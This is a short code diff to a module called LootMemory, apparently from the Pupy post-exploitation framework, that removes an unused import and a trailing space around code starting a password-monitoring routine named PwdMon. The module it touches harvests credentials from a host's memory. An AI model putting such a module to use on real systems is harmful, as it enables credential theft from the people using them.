@@ -1,6 +1,5 @@
 # -*- coding: utf-8 -*-
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
-from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="LootMemory"
 
@@ -25,7 +24,7 @@ class LootMemory(PupyModule):
 
         if args.action == 'start':
             ok = start(poll=args.poll)
-            if ok: 
+            if ok:
                 self.success('PwdMon has been started')
             else:
                 self.error('PwdMon has not been started')
